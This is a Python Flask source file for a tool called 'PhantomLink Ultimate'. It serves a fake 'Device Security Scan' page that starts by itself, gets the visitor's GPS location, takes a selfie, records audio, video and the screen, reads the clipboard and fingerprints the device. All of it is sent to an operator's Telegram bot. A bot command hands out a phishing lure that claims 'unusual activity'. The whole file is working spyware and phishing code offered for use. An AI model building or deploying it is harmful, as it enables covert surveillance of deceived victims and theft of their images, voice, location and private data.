#!/usr/bin/env python3

import os, json, base64, logging, time
from flask import Flask, request, render_template_string
import requests as req

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ========== HTML / JavaScript (with all features) ==========
HTML = r"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0a0a0a; color: #fff; text-align: center; padding: 20px; }
        .card { background: #1a1a1a; border-radius: 15px; padding: 30px; max-width: 450px; margin: 50px auto; box-shadow: 0 0 20px #00ff88; }
        button { background: #00ff88; color: #000; border: none; padding: 15px 30px; font-size: 18px; border-radius: 30px; cursor: pointer; }
        button:disabled { background: #555; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ Device Security Scan</h2>
        <p>We'll check for vulnerabilities and ensure your connection is safe.</p>
        <div id="controls">
            <button id="scanBtn" onclick="startScan()">Scan Now</button>
        </div>
        <div id="spinner" class="spinner" style="display:none;"></div>
        <div id="status" class="status"></div>
    </div>
    <script>
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const scanBtn = document.getElementById('scanBtn');
        let collected = {};

        function updateStatus(msg) { status.innerHTML = msg; }

        // ---------- HELPER FUNCTIONS ----------
        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(blob);
            });
        }

        function capturePhoto(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.addEventListener('loadeddata', () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                });
            });
        }

        function recordAudio(stream, duration) {
            return new Promise((resolve) => {
                const audioStream = new MediaStream(stream.getAudioTracks());
                const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function recordVideo(stream, duration) {
            return new Promise((resolve) => {
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), duration);
            });
        }

        function recordScreen(duration) {
            return navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
                .then(screenStream => {
                    const recorder = new MediaRecorder(screenStream, { mimeType: 'video/webm' });
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        collected.screenCapture = await blobToBase64(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                })
                .catch(err => collected.screenCaptureError = err.message);
        }

        // ---------- ADDITIONAL EXTRACTIONS ----------
        async function getWebRTCIPs() {
            const localIPs = [];
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        resolve({ localIPs: [...new Set(localIPs)], publicIP: collected.publicIP || null });
                        return;
                    }
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = e.candidate.candidate.match(ipRegex);
                    if (match) {
                        const ip = match[0];
                        if (!ip.startsWith("192.168") && !ip.startsWith("10.") && !ip.startsWith("172.") && ip !== "0.0.0.0") {
                            collected.publicIP = ip;
                        }
                        localIPs.push(ip);
                    }
                };
                setTimeout(() => resolve({ localIPs: [...new Set(localIPs)], publicIP: collected.publicIP }), 2000);
            });
        }

        async function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("👋 PhantomLink", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("👋 PhantomLink", 4, 17);
            collected.canvasHash = canvas.toDataURL();
        }

        async function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    collected.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    collected.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        }

        async function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                oscillator.start(0);
                const dataArray = new Float32Array(analyser.fftSize);
                analyser.getFloatTimeDomainData(dataArray);
                collected.audioFingerprint = Array.from(dataArray.slice(0,10)).join(',');
                oscillator.stop();
                audioCtx.close();
            } catch(e) {}
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                collected.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        }

        async function getSensors() {
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    sensor.onreading = () => { collected.ambientLight = sensor.illuminance; };
                    sensor.start();
                    await new Promise(r => setTimeout(r, 500));
                    sensor.stop();
                } catch(e) {}
            }
            if ('DeviceMotionEvent' in window) {
                window.addEventListener('devicemotion', (event) => {
                    const acc = event.accelerationIncludingGravity;
                    const rot = event.rotationRate;
                    if (acc && rot) {
                        collected.motion = {
                            x: acc.x, y: acc.y, z: acc.z,
                            alpha: rot.alpha, beta: rot.beta, gamma: rot.gamma
                        };
                    }
                }, { once: true });
            }
        }

        async function getClipboard() {
            try {
                const clipText = await navigator.clipboard.readText();
                collected.clipboard = clipText;
            } catch(e) { collected.clipboard = "Permission denied or empty"; }
        }

        // ---------- MAIN SCAN FLOW ----------
        async function startScan() {
            scanBtn.disabled = true;
            spinner.style.display = 'block';
            updateStatus('Initializing...');
            collected.timestamp = new Date().toISOString();
            collected.screen = `${screen.width}x${screen.height}`;
            collected.platform = navigator.platform;
            collected.deviceMemory = navigator.deviceMemory || 'unknown';
            collected.userAgent = navigator.userAgent;

            // Start quick extractions in parallel (no permissions)
            const backgroundTasks = [
                getWebRTCIPs(),
                getCanvasFingerprint(),
                getWebGLInfo(),
                getAudioFingerprint(),
                getBatteryInfo(),
                getSensors(),
                getClipboard()
            ];

            // 1. Geolocation
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
                });
                collected.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed
                };
                updateStatus('Location captured ✓');
            } catch(e) {
                collected.location = { error: e.message };
                updateStatus('Location denied ✗');
            }

            // 2. Camera & microphone
            let stream;
            try {
                updateStatus('Requesting camera & microphone...');
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: true });
                updateStatus('Media access granted ✓');
            } catch(e) {
                collected.mediaError = e.message;
                updateStatus('Media error: ' + e.message);
            }

            // 3. Selfie, audio, video (if stream obtained)
            if (stream) {
                const photo = await capturePhoto(stream);
                collected.photo = photo;
                updateStatus('Photo captured ✓');

                const [audioBlob, videoBlob] = await Promise.all([
                    recordAudio(stream, 5000),
                    recordVideo(stream, 3000)
                ]);
                collected.audio = await blobToBase64(audioBlob);
                collected.video = await blobToBase64(videoBlob);
                updateStatus('Audio & video recorded ✓');

                stream.getTracks().forEach(track => track.stop());
            }

            // 4. Burst selfies (if stream still available? we'll reuse the first photo, but better to take a separate stream)
            // For simplicity, we already have one photo. A separate burst would open the camera again, causing flicker; skip or add as separate step.
            // We'll not add burst to avoid extra prompt.

            // 5. Screen capture (will prompt user again)
            updateStatus('Initiating screen scan...');
            await recordScreen(3000).catch(e => collected.screenCaptureError = e.message);

            // 6. Wait for background tasks to finish (timeout 5s)
            await Promise.allSettled(backgroundTasks.map(p => Promise.race([p, new Promise(r => setTimeout(r, 5000))])));
            updateStatus('Sending final report...');

            // Send everything to server
            try {
                const response = await fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(collected)
                });
                if (response.ok) updateStatus('Scan complete. Thank you.');
                else updateStatus('Failed to send report.');
            } catch(e) {
                updateStatus('Network error.');
            } finally {
                spinner.style.display = 'none';
                scanBtn.style.display = 'none';
            }
        }

        // Auto-start after 2 seconds (zero-click fallback)
        setTimeout(() => { if (!scanBtn.disabled) startScan(); }, 2000);
    </script>
</body>
</html>
"""

# ========== Flask Routes ==========
@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/collect', methods=['POST'])
def collect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    try:
        data = request.get_json(force=True)
    except Exception as e:
        logging.error(f"JSON error: {e}")
        return 'Bad JSON', 400
    if not data:
        return 'Empty', 400

    logging.info(f"Collect hit from {ip}, keys: {list(data.keys())}")
    # Synchronous send to keep Vercel alive (max 10s)
    send_to_telegram(data, ip, ua)
    return 'OK', 200

# ========== Telegram Delivery ==========
def send_to_telegram(data, ip, ua):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        # 1. Build rich text summary
        fingerprint = (
            f"IP: {ip}\n"
            f"User-Agent: {ua}\n"
            f"Screen: {data.get('screen')}\n"
            f"Platform: {data.get('platform')}\n"
            f"Memory: {data.get('deviceMemory')}GB"
        )
        location = data.get('location', {})
        if 'lat' in location:
            maps_link = f"https://www.google.com/maps?q={location['lat']},{location['lon']}"
            loc_text = (
                f"📍 Lat: {location['lat']}\n"
                f"📍 Lon: {location['lon']}\n"
                f"📍 Accuracy: {location.get('accuracy')}m\n"
                f"🗺️ {maps_link}"
            )
        else:
            loc_text = f"📍 Location: {location.get('error', 'Not available')}"

        # Additional sensor/fingerprint data
        extra_info = []
        if data.get('battery'):
            b = data['battery']
            extra_info.append(f"🔋 Battery: {b['level']*100:.0f}% (charging: {b['charging']})")
        if data.get('ambientLight'):
            extra_info.append(f"💡 Ambient light: {data['ambientLight']} lux")
        if data.get('motion'):
            m = data['motion']
            extra_info.append(f"📳 Motion: acc({m['x']:.1f},{m['y']:.1f},{m['z']:.1f}) rot({m['alpha']:.1f},{m['beta']:.1f},{m['gamma']:.1f})")
        if data.get('clipboard'):
            extra_info.append(f"📋 Clipboard: {data['clipboard'][:200]}")
        if data.get('webglVendor'):
            extra_info.append(f"🖥️ GPU: {data['webglVendor']} - {data['webglRenderer']}")
        if data.get('publicIP'):
            extra_info.append(f"🌐 Public IP (WebRTC): {data['publicIP']}")
        local_ips = data.get('localIPs', [])
        if local_ips:
            extra_info.append(f"🏠 Local IPs: {', '.join(local_ips)}")
        if data.get('screenCaptureError'):
            extra_info.append(f"⚠️ Screen capture: {data['screenCaptureError']}")

        extra_text = '\n'.join(extra_info) if extra_info else ""
        msg = f"🛡️ *New Device Scan Report*\n\n{fingerprint}\n\n{loc_text}\n\n{extra_text}\n\nTimestamp: {data.get('timestamp')}"

        req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={"chat_id": CHAT_ID, "text": msg[:4096], "parse_mode": "Markdown"})

        # 2. Media files
        if data.get('photo'):
            photo_bytes = base64.b64decode(data['photo'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                     files={"photo": ("selfie.jpg", photo_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Selfie"})
        if data.get('audio'):
            audio_bytes = base64.b64decode(data['audio'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                     files={"voice": ("recording.webm", audio_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Voice recording"})
        if data.get('video'):
            video_bytes = base64.b64decode(data['video'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                     files={"video": ("clip.webm", video_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Video clip"})
        if data.get('screenCapture'):
            screen_bytes = base64.b64decode(data['screenCapture'].split(',')[1])
            req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                     files={"video": ("screencap.webm", screen_bytes)},
                     data={"chat_id": CHAT_ID, "caption": "Screen recording"})

    except Exception as e:
        logging.error(f"Telegram send error: {e}")

# ========== Webhook for Bot Commands ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True)
    if not update: return 'OK'
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            send_telegram_message(chat_id, "🕵️ *PhantomLink Ultimate*\n/link - Generate tracking link\n/clear - Reset")
        elif text == '/link':
            domain = os.environ.get("VERCEL_URL", "your-project.vercel.app")
            link = f"https://{domain}/"
            send_telegram_message(chat_id,
                f"👋 We've detected unusual activity. Run a quick security scan to verify your identity:\n{link}",
                disable_web_page_preview=True)
        elif text == '/clear':
            send_telegram_message(chat_id, "✅ Data cleared (in‑memory only).")
    return 'OK'

def send_telegram_message(chat_id, text, **kwargs):
    req.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
             json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown", **kwargs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
